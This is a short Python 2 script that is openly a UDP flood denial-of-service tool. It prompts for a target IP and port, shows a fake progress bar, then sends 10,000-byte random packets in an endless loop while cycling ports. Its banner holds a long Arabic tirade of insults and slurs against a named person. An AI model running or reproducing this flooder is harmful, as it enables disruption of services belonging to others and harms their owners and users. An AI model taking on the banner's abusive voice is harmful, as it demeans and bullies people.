import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Settings ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 
############# Settings ##############

os.system ("clear")
print ('''
\033[91m
       علاوي حبيب كلبي ابو حسين انا خادمكم الصغير انت عندك نقص بشخصيتك بسبب اهلك يجوز سايقين عليك او ولد المنطقه مسوي لك ميز كال تنمر عليك و على شكلك فلهذا تريد تعوض النقص الي بداخلك بهيج سوالف فارغه مثلك و مثل صاحبك الثاني لا و اصلا من تحجي بالقروب محد مهتم لك و كلهم لابسينك يسلكون براسك لان انت وضيع و عديم قيمه انت واحد منغولي معيدي المن عايش حياتك روح شوف شغله تسويها يا متخلفه هو انت ضعيف شخصيه و بيك عقد نفسيه لان بالواقع شخصيتك متخلخله من قد ما يفشلونك و حتى يتنمرون عليك فتشوف الكل مثلك
                               \033[92m[\033[91mPowered By : Ronaldo\033[92m]
                               \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
''')
ip = raw_input("Ip Address : ")
port = input("Port       : ")

os.system("clear")
print "\033[91mMission Start DDOS"
print "\033[91m[                    ] 0% "
time.sleep(2)
print "\033[92m[=====               ] 10%"
time.sleep(2)
print "\033[92m[=====               ] 20%"
time.sleep(2)
print "\033[92m[=====               ] 25%"
time.sleep(2)
print "\033[92m[==========          ] 50%"
time.sleep(2)
print "\033[92m[===============     ] 75%"
time.sleep(2)
print "\033[92m[====================] 100%"
time.sleep(2)
os.system ("clear")
sent = 100
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 200
     port = port + 200
     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port)
     if port == 6553444:
       port = 50
